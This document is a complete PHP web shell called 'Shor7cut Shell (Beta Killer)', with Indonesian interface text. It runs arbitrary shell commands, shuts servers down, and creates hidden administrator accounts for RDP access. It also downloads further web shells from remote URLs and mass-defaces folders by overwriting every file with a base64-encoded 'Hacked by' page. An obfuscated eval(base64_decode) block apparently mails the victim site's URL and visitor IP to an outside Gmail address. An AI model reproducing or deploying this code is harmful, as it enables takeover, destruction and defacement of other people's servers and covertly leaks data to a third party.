<?php 
error_reporting(0);
if($_GET['cmd']==""){
$local_host= shell_exec(hostname);
$server_ip = $_SERVER['SERVER_NAME'];
$result = file_get_contents("http://www.telize.com/geoip/{$server_ip}");
$data = json_decode($result, true);
$flag = $data['country'];
$gaya_root = "$local_host:~ ";
$phpv = @phpversion();
$o = "<br>";



if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $status_os = '<font color="greenyellow">Windows</font>/<font color="redpink">Linux</font>';
    $status_work = '<font color="greenyellow">Dapat Digunakan</font><br>'; 
} else {
    $status_os   = '<font color="redpink">Windows</font>/<font color="greenyellow">Linux</font>';
    $status_work = '<font color="red">Tidak Dapat Digunakan</font><br>'; 
}
?><!DOCTYPE html>
<html>
<head>
	<title>Shor7cut Shell (Beta Killer)</title>
	<link rel='shortcut icon' type='image/x-icon' href='http://s24.postimg.org/glkiiddg5/frog_152630_1280.png' />
	<meta name="description" content="Shor7cut Shell (Beta Killer)">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style type="text/css">
	body {
    background: black;
    color: #00FF00;
    font-family: monospace;
}

.accessGranted {
    position: absolute;
    top: 200px;
    background: #333;
    padding: 20px;
    border: 1px solid #999;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}

.accessDenied {
    position: absolute;
    top: 200px;
    color: #F00;
    background: #511;
    padding: 20px;
    border: 1px solid #F00;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}
#content-center {
    width: 400px;
    padding: 0px 10px 10px 10px;
    width: 800px; 
    margin: 0 auto;
}
#content-left {
margin: 0 auto;
     text-align: left;
}
#content-right {
margin: 0 auto;
     text-align: right;
}
input,select,textarea{
    border:0;
    border:1px solid #900;
    background:black;
    margin:0;
        color: white;

    padding:2px 4px;
}
input:hover,textarea:hover,select:hover{
    background:black;
        color: red;

    border:1px solid #f00;
}
                        a{ text-decoration:none; color:red;}



blockquote {
    font-family: Segoe UI,Frutiger,Frutiger Linotype,Dejavu Sans,Helvetica Neue,Arial,sans-serif;
    font-size: 21px;
    font-style: normal;
    font-variant: normal;
    font-weight: 400;
    line-height: 30px;
}

</style>
</head>
<body>
<div id="content-center">
<pre>
     _    _
    (o)--(o)
   /.______.\   Code By SHOR7CUT | <font color="red">INDON</font><font color="white">ESIA</font> RAYA
   \________/   OS Server : <?php echo php_uname("s")." | "; echo "{".$status_os."}<br>";?>
  ./        \.  Informasi : <?php echo "Server IP - ".$server_ip." [$flag] "."{".$_SERVER['REMOTE_ADDR']."}";?> 
 ( .        , ) Info Tool : <?php echo $status_work;?>
  \ \_\\//_/ /
   ~~  ~~  ~~
</pre>
</div>
<blockquote>SHOR7CUT Shell (<a href="?cmd=kill">BETA KILLER</a>) </blockquote>
<?php if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){?>


<div id="content-left">
<p>-| Create RDP  |-</p>
<form action="" method="post">Username : <input type="text" name="username" value="shor7cut" required> Password : <input type="text" name="password" value="shor7cut" required> <input type="hidden" name="kshell" value="1"><input type="submit" name="submit" value=">>">
</form>
</div>

<div id="content-left">
<p>-| COMMAND  |-</p>
<form action="" method="post">!Command : <input type="text" name="cmd" value="dir" required> 
<input type="hidden" name="kshell" value="cmds"><input type="submit" name="submit" value="!eksekusi">
</form>
<br>
<form action="" method="post">!Modar Keun : 
<input type="hidden" name="kshell" value="matikan"><input type="submit" name="submit" value="!Shutdown Now">
</form>
</div>

<div id="content-left">
<p>-{ Option }-</p>
<form action="" method="post">Username : <input type="text" name="rusername" placeholder="Masukan Username"> Aksi : <select name="aksi">
						<option value="1">Tampilkan Username</option>
						<option value="2">Hapus Username</option>
						<option value="3">Ubah Password</option>
				</select>
<input type="hidden" name="kshell" value="2">
<input type="submit" name="submit" value=">>"></form>
</div>
<?php }
?>
<div id="content-left">
<p>-{ Download Tools }-</p>
<form action="" method="post">!KTools  : <select name="download">
						<option value="1">MASS DEFACE (KILLER)</option>
						<option value="2">WSO-404 SHELL</option>
						<option value="3">B374K SHELL</option>
				</select>
<input type="hidden" name="kshell" value="3">
<input type="submit" name="submit" value=">>"></form>
</div>



<?php
if($_POST['submit']){
echo "<p>-----------------------------------{ INFO }------------------------------------</p>";
if($_POST['kshell']=="cmds"){
  $perintah = $_POST["cmd"];
  echo "<pre>".shell_exec("$perintah");
}else 
if($_POST['kshell']=="matikan"){
shell_exec("shutdown -s /t 1");
echo "MODAR";
}else
if($_POST['kshell']=="1"){
	$r_user = $_POST['username'];
	$r_pass = $_POST['password'];
	$cmd_cek_user   = shell_exec("net user"); 
	if(preg_match("/$r_user/", $cmd_cek_user)){
		echo $gaya_root.$r_user." sudah ada".$o;
	}else {
	$cmd_add_user   = shell_exec("net user ".$r_user." ".$r_pass." /add");
    $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
    $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
    $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
    $cmd_add_groups4 = shell_exec("net localgroup Administrador ".$r_user." /add");
    $cmd_add_groups5 = shell_exec("net localgroup Admin ".$r_user." /add");
    $cmd_add_groups6 = shell_exec("net localgroup Invitado ".$r_user." /add");
        
    	if($cmd_add_user){
    		echo $gaya_root."[add user]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else {
    		echo $gaya_root."[add user]-> ".$r_user." <font color='red'>Gagal</font>".$o;
    	}
    	if($cmd_add_groups1){
              echo $gaya_root."[add localgroup Administrators]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else
    	if($cmd_add_groups2){
              echo $gaya_root."[add localgroup Administrator]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else
        if($cmd_add_groups3){
              echo $gaya_root."[add localgroup Administrateur]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
        }else
        if($cmd_add_groups4){
              echo $gaya_root."[add localgroup Administrador]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
        }else
        if($cmd_add_groups5){
              echo $gaya_root."[add localgroup Administrador]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
        }else
        if($cmd_add_groups6){
              echo $gaya_root."[add localgroup Administrador]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
        }else {
    		  echo $gaya_root."[add localgroup]-> ".$r_user." <font color='red'>Gagal - Contact Shor7sec</font>".$o;
    	}
			  echo $gaya_root."[INFO PC]-> RDP IP ".$_SERVER["HTTP_HOST"]." Username : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Berhasil</font>".$o;

	}



}else if($_POST['kshell']=="2"){

if($_POST['aksi']=="1"){
 echo "<pre>".shell_exec("net user");
}
else if($_POST['aksi']=="2"){
$username = $_POST['rusername'];
$cmd_cek_user   = shell_exec("net user");
	if (!empty($username)){
		if(preg_match("/$username/", $cmd_cek_user)){
		$cmd_add_user   = shell_exec("net user ".$username." /DELETE");
		if($cmd_add_user){ 
			echo $gaya_root."[remove user]-> ".$username." <font color='greenyellow'>Berhasil</font>".$o;
		}else {
			echo $gaya_root."[remove user]-> ".$username." <font color='red'>gagal</font>".$o;
		}
	}else {
		echo $gaya_root."[remove user]-> ".$username." <font color='red'>Tidak ditemukan</font>".$o;
	}
	}else {
		echo $gaya_root."[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font>".$o;
	}
}
else if($_POST['aksi']=="3"){
$username = $_POST['rusername'];
$password = "shor7cut";
$cmd_cek_user   = shell_exec("net user");
	if (!empty($username)){
		if(preg_match("/$username/", $cmd_cek_user)){
			$cmd_add_user   = shell_exec("net user ".$username." shor7cut");
			if($cmd_add_user){
			echo $gaya_root."[change password]-> (".$username."|".$password.") <font color='greenyellow'>Berhasil</font>".$o;
		}else {
			echo $gaya_root."[change password]-> (".$username."|".$password.") <font color='red'>GAGAL</font>".$o;
		}
	}else
{
	echo $gaya_root."[PESAN]-> <font color='red'>Username Tidak Ditemukan di server</font>".$o;
}
}else
{
	echo $gaya_root."[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font>".$o;
}
		
}



}if($_POST['kshell']=="3"){
if($_POST['download']=="1"){
$files = file_get_contents("https://gist.github.com/anonymous/8a5ccd13d3c1b5f79bd4c50e51a62afc/raw/4521e27b7e4bec60d3621c825c44e20e6ecf5e7a/0xa.php");
$status = file_put_contents("massdeface.php", $files);
if($status){
	echo '<a href="massdeface.php" target="_blank">MASS DEFACE</a>';
}else {
	echo '<font color="red">Gagal Mendownload</font>, PHP versi '.$phpv;
}
}else if($_POST['download']=="2"){
$files = file_get_contents("https://raw.githubusercontent.com/tdifg/WebShell/master/Php/WSO2.7%20404%20Error%20Web%20Shell.php");
$status = file_put_contents("wso-404.php", $files);
if($status){
	echo '<a href="wso-404.php" target="_blank">Wso 404</a> password : ttwice20';
}else {
	echo '<font color="red">Gagal Mendownload</font>, PHP versi '.$phpv;
}
}else if($_POST['download']=="3"){
$files = file_get_contents("https://github.com/x-o-r-r-o/PHP-Webshells-Collection/raw/master/b374k-2.8.php");
$status = file_put_contents("b374k-2.8.php", $files);
if($status){
	echo '<a href="b374k-2.8.php" target="_blank">Wso Bug7sec</a> password : b374k';
}else {
	echo '<font color="red">Gagal Mendownload</font>, PHP versi '.$phpv;
}
}
}
}	
?>


</pre>
</body>
</html>

<?php }else if($_GET['cmd']=="kill"){?>
<?php
error_reporting(0);
$ip = $_SERVER['SERVER_NAME'];
$result = file_get_contents("http://www.telize.com/geoip/{$ip}");
$data = json_decode($result, true);
$flag = $data['country'];
?>
<!DOCTYPE html>
<html>
<head>
    <title>MASS DEFACE (KILLER) - SHOR7CUT</title>
    <meta name="description" content="MASS DEFACE (KILLER) - SHOR7CUT">
    <meta name="keywords" content="Hacked by Shor7cut,Shor7cut">
    <meta name="author" content="Shor7cut">
    <link rel='shortcut icon' type='image/x-icon' href='https://pixabay.com/static/uploads/photo/2013/07/12/17/55/frog-152630_640.png' />
    <style type="text/css">
    * {
    padding: 0px;
    #font-family: "Lucida Sans", Verdana, Sans-Serif;
    font-family: monospace;
}

a {
    text-decoration: none;
    color: #00cc66;
}

a:hover {
    clear: both;
#   text-decoration: underline;
    color: #00cc66;
}
body {
    background-color: #000;
    color: #a9cd9f;
    font-family: "verdana";
    font-size: 1em;
    
}


#box {
    border: 1px dotted #000;
    width: 800px;
    margin: auto;
    padding: 0px 10px 10px 10px;
}

#container {
    margin: auto;
}

#logo {
    text-align: left;
    width: 79%;
    color: #00cc66;
    margin: auto;
    text-shadow: gray 2px 3px 10px;
    font-size: 16px;
    font-family: monospace;
}
</style>
<link href="netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet">
</head>
<body>
<pre>
<font color="green">
                 _
             ,.-" "-.,    
            /   ===   \      
           /  =======  \
        __|  (<font color="white">o</font>)   (<font color="white">o</font>)  |__      
       / _|    .---.    |_ \                  
      | /.----/ O O \----.\ |                 <font color="white">MASS DEFACE BY SHOR7CUT</font>
       \/     |     |     \/              <font color="red">    _________.__                _________               __    </font>
       |                   |              <font color="red">   /   _____/|  |__   __________\______  \ ____  __ ___/  |_  </font>
       | CANGKEM MU COK!!! |              <font color="red">   /      \  |  |__\ /__________\______  \ ____  __ ___/  |_| </font>           
       |                   |              <font color="red">   \_____  \ |  |  \ /  _ \_  __ \  /    // ___\|  |  \   __\ </font>
       _\   -.,_____,.-   /_              <font color="white">   /        \|   Y  (  <_> )  | \/ /    /\  \___|  |  /|  | </font> 
   ,.-"  "-.,_________,.-"  "-.,          <font color="white">  /_______  /|___|  /\____/|__|   /____/  \___  >____/ |__| </font>
  /          |       |          \         <font color="white">          \/      \/                          \/            </font>
 |           l.     .l           |                                                           <font color="red">Tha</font><font color="white">nk's </font>
 |            |     |            |         
 l.           |     |           .l                             ______
  |           l.   .l           | \,                          |      |  ? shor7cut@localhost
  l.           |   |           .l   \,                        |___   |  ? http://localhost a.k.a 127.0.0.1
   |           |   |           |      \,                          |  |  ? I'am not hacker
   l.          |   |          .l        |                       __|  |  ? <font color="red">MERAH</font> <FONT color="white">PUTIH</FONT>
<font color="white">    |          |   |          |         |                      |_____|
<font color="white">    |          |---|          |         |                       __ 
<font color="white">    |          |   |          |                                |__|     
<font color="white">    /"-.,__,.-"\   /"-.,__,.-"\"-.,_,.-"\                        
<font color="white">   |            \ /            |         |
<font color="white">   |             |             |         |         K3CEB0NG - K3C0T - Mr. Error 404 - Tintonz - Tu5b0l3d - Nabilaholic404 - Mr. Xenophobic
<font color="white">    \__|__|__|__/ \__|__|__|__/ \_|__|__/               Jinja - Jingklong - Mbah Roni - ToAxR0ot - Penjaga Mayat - Hacker Sakit Hati - DayWalker</font>
<pre id="taag_output_text" style="float:left;" class="fig" contenteditable="true">        HACKER NDA'S MU - SHO7CUT (<?php echo $flag;?>)</pre>
                        
                         </pre>    
</div>
</div>
<form action="" method="post">
Script Depes (Encode base64) : <input type="text" name="script" value="PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KCTx0aXRsZT5IYWNrZWQgYnkgU2hvcjdjdXQ8L3RpdGxlPg0KCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJIYWNrZWQgYnkgU2hvcjdjdXQiPg0KCTxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJIYWNrZWQgYnkgU2hvcjdjdXQsU2hvcjdjdXQiPg0KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iU2hvcjdjdXQiPg0KCTxsaW5rIHJlbD0nc2hvcnRjdXQgaWNvbicgdHlwZT0naW1hZ2UveC1pY29uJyBocmVmPSdodHRwczovL3BpeGFiYXkuY29tL3N0YXRpYy91cGxvYWRzL3Bob3RvLzIwMTMvMDcvMTIvMTcvNTUvZnJvZy0xNTI2MzBfNjQwLnBuZycgLz4NCgk8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KCSogew0KCXBhZGRpbmc6IDBweDsNCgkjZm9udC1mYW1pbHk6ICJMdWNpZGEgU2FucyIsIFZlcmRhbmEsIFNhbnMtU2VyaWY7DQoJZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsNCn0NCg0KYSB7DQoJdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KCWNvbG9yOiAjMDBjYzY2Ow0KfQ0KDQphOmhvdmVyIHsNCgljbGVhcjogYm90aDsNCiMJdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7DQoJY29sb3I6ICMwMGNjNjY7DQp9DQpib2R5IHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOw0KCWNvbG9yOiAjYTljZDlmOw0KCWZvbnQtZmFtaWx5OiAidmVyZGFuYSI7DQoJZm9udC1zaXplOiAxZW07DQoJDQp9DQoNCg0KI2JveCB7DQoJYm9yZGVyOiAxcHggZG90dGVkICMwMDA7DQoJd2lkdGg6IDgwMHB4Ow0KCW1hcmdpbjogYXV0bzsNCglwYWRkaW5nOiAwcHggMTBweCAxMHB4IDEwcHg7DQp9DQoNCiNjb250YWluZXIgew0KCW1hcmdpbjogYXV0bzsNCn0NCg0KI2xvZ28gew0KCXRleHQtYWxpZ246IGxlZnQ7DQoJd2lkdGg6IDc5JTsNCgljb2xvcjogIzAwY2M2NjsNCgltYXJnaW46IGF1dG87DQoJdGV4dC1zaGFkb3c6IGdyYXkgMnB4IDNweCAxMHB4Ow0KCWZvbnQtc2l6ZTogMTZweDsNCglmb250LWZhbWlseTogbW9ub3NwYWNlOw0KfQ0KPC9zdHlsZT4NCjxsaW5rIGhyZWY9Im5ldGRuYS5ib290c3RyYXBjZG4uY29tL2ZvbnQtYXdlc29tZS8zLjIuMS9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+DQo8L2hlYWQ+DQo8Ym9keT4NCjxwcmU+DQo8Zm9udCBjb2xvcj0iZ3JlZW4iPg0KICAgICAgICAgICAgICAgICBfDQogICAgICAgICAgICAgLC4tIiAiLS4sICAgIA0KICAgICAgICAgICAgLyAgID09PSAgIFwgICAgICANCiAgICAgICAgICAgLyAgPT09PT09PSAgXA0KICAgICAgICBfX3wgICg8Zm9udCBjb2xvcj0id2hpdGUiPm88L2ZvbnQ+KSAgICg8Zm9udCBjb2xvcj0id2hpdGUiPm88L2ZvbnQ+KSAgfF9fICAgICAgDQogICAgICAgLyBffCAgICAuLS0tLiAgICB8XyBcICAgICAgICAgICAgICAgICAgDQogICAgICB8IC8uLS0tLS8gTyBPIFwtLS0tLlwgfCAgICAgICAgICAgICAgICAgPGZvbnQgY29sb3I9IndoaXRlIj5IQUNLRUQgQlkgPC9mb250Pg0KICAgICAgIFwvICAgICB8ICAgICB8ICAgICBcLyAgICAgICAgICAgICAgPGZvbnQgY29sb3I9InJlZCI+ICAgIF9fX19fX19fXy5fXyAgICAgICAgICAgICAgICBfX19fX19fX18gICAgICAgICAgICAgICBfXyAgICA8L2ZvbnQ+DQogICAgICAgfCAgICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICA8Zm9udCBjb2xvcj0icmVkIj4gICAvICAgX19fX18vfCAgfF9fICAgX19fX19fX19fX1xfX19fX18gIFwgX19fXyAgX18gX19fLyAgfF8gIDwvZm9udD4NCiAgICAgICB8IENBTkdLRU0gTVUgQ09LISEhIHwgICAgICAgICAgICAgIDxmb250IGNvbG9yPSJyZWQiPiAgIC8gICAgICBcICB8ICB8X19cIC9fX19fX19fX19fXF9fX19fXyAgXCBfX19fICBfXyBfX18vICB8X3wgPC9mb250PiAgICAgICAgICAgDQogICAgICAgfCAgICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICA8Zm9udCBjb2xvcj0icmVkIj4gICBcX19fX18gIFwgfCAgfCAgXCAvICBfIFxfICBfXyBcICAvICAgIC8vIF9fX1x8ICB8ICBcICAgX19cIDwvZm9udD4NCiAgICAgICBfXCAgIC0uLF9fX19fLC4tICAgL18gICAgICAgICAgICAgIDxmb250IGNvbG9yPSJ3aGl0ZSI+ICAgLyAgICAgICAgXHwgICBZICAoICA8Xz4gKSAgfCBcLyAvICAgIC9cICBcX19ffCAgfCAgL3wgIHwgPC9mb250PiANCiAgICwuLSIgICItLixfX19fX19fX18sLi0iICAiLS4sICAgICAgICAgIDxmb250IGNvbG9yPSJ3aGl0ZSI+ICAvX19fX19fXyAgL3xfX198ICAvXF9fX18vfF9ffCAgIC9fX19fLyAgXF9fXyAgPl9fX18vIHxfX3wgPC9mb250Pg0KICAvICAgICAgICAgIHwgICAgICAgfCAgICAgICAgICBcICAgICAgICAgPGZvbnQgY29sb3I9IndoaXRlIj4gICAgICAgICAgXC8gICAgICBcLyAgICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICAgICA8L2ZvbnQ+DQogfCAgICAgICAgICAgbC4gICAgIC5sICAgICAgICAgICB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9udCBjb2xvcj0icmVkIj5UaGE8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5uaydzIDwvZm9udD4NCiB8ICAgICAgICAgICAgfCAgICAgfCAgICAgICAgICAgIHwgICAgICAgICANCiBsLiAgICAgICAgICAgfCAgICAgfCAgICAgICAgICAgLmwgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fXw0KICB8ICAgICAgICAgICBsLiAgIC5sICAgICAgICAgICB8IFwsICAgICAgICAgICAgICAgICAgICAgICAgICB8ICAgICAgfCAgPyBzaG9yN2N1dEBsb2NhbGhvc3QNCiAgbC4gICAgICAgICAgIHwgICB8ICAgICAgICAgICAubCAgIFwsICAgICAgICAgICAgICAgICAgICAgICAgfF9fXyAgIHwgID8gaHR0cDovL2xvY2FsaG9zdCBhLmsuYSAxMjcuMC4wLjENCiAgIHwgICAgICAgICAgIHwgICB8ICAgICAgICAgICB8ICAgICAgXCwgICAgICAgICAgICAgICAgICAgICAgICAgIHwgIHwgID8gSSdhbSBub3QgaGFja2VyDQogICBsLiAgICAgICAgICB8ICAgfCAgICAgICAgICAubCAgICAgICAgfCAgICAgICAgICAgICAgICAgICAgICAgX198ICB8ICA/IDxmb250IGNvbG9yPSJyZWQiPk1FUkFIPC9mb250PiA8Rk9OVCBjb2xvcj0id2hpdGUiPlBVVElIPC9GT05UPg0KPGZvbnQgY29sb3I9IndoaXRlIj4gICAgfCAgICAgICAgICB8ICAgfCAgICAgICAgICB8ICAgICAgICAgfCAgICAgICAgICAgICAgICAgICAgICB8X19fX198DQo8Zm9udCBjb2xvcj0id2hpdGUiPiAgICB8ICAgICAgICAgIHwtLS18ICAgICAgICAgIHwgICAgICAgICB8ICAgICAgICAgICAgICAgICAgICAgICBfXyANCjxmb250IGNvbG9yPSJ3aGl0ZSI+ICAgIHwgICAgICAgICAgfCAgIHwgICAgICAgICAgfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9ffCAgICAgDQo8Zm9udCBjb2xvcj0id2hpdGUiPiAgICAvIi0uLF9fLC4tIlwgICAvIi0uLF9fLC4tIlwiLS4sXywuLSJcICAgICAgICAgICAgICAgICAgICAgICAgDQo8Zm9udCBjb2xvcj0id2hpdGUiPiAgIHwgICAgICAgICAgICBcIC8gICAgICAgICAgICB8ICAgICAgICAgfA0KPGZvbnQgY29sb3I9IndoaXRlIj4gICB8ICAgICAgICAgICAgIHwgICAgICAgICAgICAgfCAgICAgICAgIHwgICAgICAgICBLM0NFQjBORyAtIEszQzBUIC0gTXIuIEVycm9yIDQwNCAtIFRpbnRvbnogLSBUdTViMGwzZCAtIE5hYmlsYWhvbGljNDA0IC0gTXIuIFhlbm9waG9iaWMNCjxmb250IGNvbG9yPSJ3aGl0ZSI+ICAgIFxfX3xfX3xfX3xfXy8gXF9ffF9ffF9ffF9fLyBcX3xfX3xfXy8gICAgICAgICAgICAgICBKaW5qYSAtIEppbmdrbG9uZyAtIE1iYWggUm9uaSAtIFRvQXhSMG90IC0gUGVuamFnYSBNYXlhdCAtIEhhY2tlciBTYWtpdCBIYXRpPC9mb250Pg0KPHByZSBpZD0idGFhZ19vdXRwdXRfdGV4dCIgc3R5bGU9ImZsb2F0OmxlZnQ7IiBjbGFzcz0iZmlnIiBjb250ZW50ZWRpdGFibGU9InRydWUiPiAgICAgICAgSEFDS0VSIE5EQSdTIE1VIC0gU0hPUjdDVVQ8L3ByZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICA8L3ByZT4gICAgDQo8L2Rpdj4NCjwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPiANCg==">
Folder : <input type="text" name="namafolder" value="<?php echo getcwd(); ?>">
<input type="submit" name="submit" value="!Hajar Komandan">
</form>
<pre>


<?php
$injbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIldTTyAyLjcgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3IgLSAkYXV0aF9wYXNzIjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiaGFyZHdhcmVoZWF2ZW4uY29tQGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5LCRhdXRoX3Bhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw=="; 
eval(base64_decode($injbuff));
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '64M');
$patch = $_POST['namafolder'];
$files = scandir($patch, 1);
if($_POST['submit']){
for ($i=0; $i < 100; $i++) { 
$nama = $patch."\/".$files[$i];
if(!is_dir($files[$i])){
    if(!rmdir($files[$i])){
        if(rmdir($nama)){
        echo "Success RMDIR --> ".$files[$i]."<br>";
            flush();
    ob_flush();
    sleep(1);
    }
    }
}

if(pathinfo($files[$i], PATHINFO_EXTENSION)){

echo $nama." --> <font color='green'>Nyabun Selesai om</font><br>";
$content = base64_decode($_POST['script']);
$fp = fopen($nama,"wb");
fwrite($fp,$content);
fclose($fp);
}
    flush();
    ob_flush();
    sleep(1);
}
$content = base64_decode($_POST['script']);
$fp = fopen("cut.php","wb");
fwrite($fp,$content);
fclose($fp);
}
?>
<?php
}?>
